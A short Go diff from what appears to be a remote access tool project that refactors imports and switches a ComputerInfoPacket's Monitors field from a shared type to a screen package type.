@@ -4,8 +4,8 @@ import (
 	"oslib"
 	"rat/client/computer"
 	"rat/client/screen"
-	"rat/shared"
-	"rat/shared/network/header"
+
+	"rat/client/network/header"
 )
 
 type ComputerInfoPacket struct {
@@ -15,7 +15,7 @@ type ComputerInfoPacket struct {
 		Type    string
 		Display string
 	} `os`
-	Monitors []shared.Monitor
+	Monitors []screen.Monitor
 }
 
 func (packet ComputerInfoPacket) Header() header.PacketHeader {
